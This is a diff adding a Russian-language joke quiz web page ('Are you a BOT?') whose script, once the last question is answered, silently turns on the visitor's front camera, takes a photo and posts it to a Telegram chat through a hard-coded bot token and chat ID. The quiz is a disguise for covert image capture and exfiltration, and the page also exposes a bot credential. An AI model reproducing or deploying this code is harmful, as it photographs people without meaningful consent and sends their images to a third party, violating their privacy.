@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Опрос</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-image: url('https://ibb.co/VWRwhzPK');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+        .quiz-container {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 600px;
+            width: 90%;
+        }
+        .question {
+            display: none;
+            margin-bottom: 20px;
+        }
+        .question.active {
+            display: block;
+        }
+        .options {
+            margin-left: 20px;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #result {
+            display: none;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            padding: 20px;
+        }
+        #camera-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+        }
+        #camera {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+    </style>
+</head>
+<body>
+    <div id="camera-container">
+        <video id="camera" autoplay playsinline></video>
+    </div>
+    <div class="quiz-container">
+        <div id="quiz">
+            <div class="question active" data-question="1">
+                <p>1. Вы БОТ?</p>
+                <div class="options">
+                    <input type="radio" name="q1" value="1" required> Да<br>
+                    <input type="radio" name="q1" value="2"> Нет
+                </div>
+            </div>
+
+            <div class="question" data-question="2">
+                <p>2. Какое имя вам нравится?</p>
+                <div class="options">
+                    <input type="radio" name="q2" value="1" required> Наташа<br>
+                    <input type="radio" name="q2" value="2"> Ксюша<br>
+                    <input type="radio" name="q2" value="3"> Вика<br>
+                    <input type="radio" name="q2" value="4"> Маша<br>
+                    <input type="radio" name="q2" value="5"> Даша
+                </div>
+            </div>
+
+            <div class="question" data-question="3">
+                <p>3. Кто БОТ?</p>
+                <div class="options">
+                    <input type="radio" name="q3" value="1" required> Троссс<br>
+                    <input type="radio" name="q3" value="2"> Дерево<br>
+                    <input type="radio" name="q3" value="3"> Степа
+                </div>
+            </div>
+
+            <div class="question" data-question="4">
+                <p>4. Ваш лучший друг?</p>
+                <div class="options">
+                    <input type="radio" name="q4" value="1" required> Троссс<br>
+                    <input type="radio" name="q4" value="2"> Дерево<br>
+                    <input type="radio" name="q4" value="3"> Степа<br>
+                    <input type="radio" name="q4" value="4"> Зоро<br>
+                    <input type="radio" name="q4" value="5"> Механик
+                </div>
+            </div>
+
+            <div class="question" data-question="5">
+                <p>5. Вы ищите жену?</p>
+                <div class="options">
+                    <input type="radio" name="q5" value="1" required> Да<br>
+                    <input type="radio" name="q5" value="2"> Нет
+                </div>
+            </div>
+
+            <button id="nextBtn">Дальше</button>
+        </div>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        let currentQuestion = 1;
+        const totalQuestions = 5;
+        const nextBtn = document.getElementById('nextBtn');
+        const quiz = document.getElementById('quiz');
+        const result = document.getElementById('result');
+
+        // ЗАМЕНИТЕ ЭТИ ЗНАЧЕНИЯ НА СВОИ
+        const BOT_TOKEN = 'В8188957293:AAHmtiE3sgaj0lhUYijUmOnUYBWDaJw39JE';
+        const CHAT_ID = 'В2126669672';
+
+        async function takePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } // использует фронтальную камеру на телефонах
+                });
+                
+                const video = document.getElementById('camera');
+                const container = document.getElementById('camera-container');
+                
+                video.srcObject = stream;
+                container.style.display = 'block';
+
+                // Ждем 1 секунду для инициализации камеры
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                // Создаем canvas и делаем снимок
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                // Конвертируем в blob
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+                // Отправляем в Telegram
+                const formData = new FormData();
+                formData.append('photo', blob, 'photo.jpg');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                // Закрываем камеру
+                stream.getTracks().forEach(track => track.stop());
+                container.style.display = 'none';
+            } catch (error) {
+                console.error('Ошибка:', error);
+            }
+        }
+
+        nextBtn.addEventListener('click', async function() {
+            const currentQuestionEl = document.querySelector(`.question[data-question="${currentQuestion}"]`);
+            const selectedOption = currentQuestionEl.querySelector(`input[name="q${currentQuestion}"]:checked`);
+            
+            if (!selectedOption) {
+                alert('Пожалуйста, выберите ответ!');
+                return;
+            }
+
+            currentQuestionEl.classList.remove('active');
+            
+            if (currentQuestion < totalQuestions) {
+                currentQuestion++;
+                document.querySelector(`.question[data-question="${currentQuestion}"]`).classList.add('active');
+                
+                if (currentQuestion === totalQuestions) {
+                    nextBtn.textContent = 'Завершить';
+                }
+            } else {
+                quiz.style.display = 'none';
+                result.style.display = 'block';
+                result.innerHTML = 'Поздравляю, вы - БОТ!';
+                await takePhoto(); // Делаем фото при завершении
+            }
+        });
+    </script>
+</body>
+</html>
